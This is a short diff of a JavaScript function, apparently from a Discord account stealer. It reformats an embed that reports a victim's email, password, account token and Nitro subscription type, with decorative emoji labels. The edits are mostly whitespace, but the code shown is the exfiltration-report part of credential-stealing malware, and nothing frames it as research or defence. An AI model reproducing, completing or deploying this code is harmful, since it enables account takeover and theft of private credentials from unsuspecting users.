@@ -152,15 +152,15 @@ function Login(email, password, token) {
 
                             
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                             
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                      <:staff_blue:936543701294010399> **Password:** \`${password}\``,       
                             
                             
-                            <:staff_blue:936543701294010399> **Password:** \`${password}\``,
+                            
                             "inline": true
                         },
-
                                 {
                                    "name": "<a:arrow:765308889859751976> **Other Info**",
+
 
 
                                    "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
@@ -172,7 +172,7 @@ function Login(email, password, token) {
                                  },
                                 
 
-                                 
+
                                  {
                             "name": "**Token**",
                             "value": `\`${token}\``,
